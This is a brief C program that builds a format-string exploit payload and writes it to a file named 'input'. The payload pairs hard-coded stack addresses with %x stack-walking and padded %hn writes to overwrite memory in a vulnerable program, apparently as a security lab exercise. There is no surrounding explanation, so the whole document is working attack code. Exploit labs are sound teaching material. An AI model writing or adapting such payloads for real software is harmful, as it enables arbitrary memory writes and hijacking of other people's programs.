#include <stdio.h>
#include <stdlib.h>

int main(void){
    char buffer[100]="\x40\xec\xff\xbf@@@@\x38\xec\xff\xbf|%.8x|%.8x|%.8x|%.8x|%.8x|%.26198x%hn|%.4368x%hn";
    FILE *input = fopen("input","w");
    if(!input){
        printf("cannt open input file");
        exit(0);
    }
    fwrite(buffer,sizeof(char),sizeof(buffer),input);
    return 0;
}
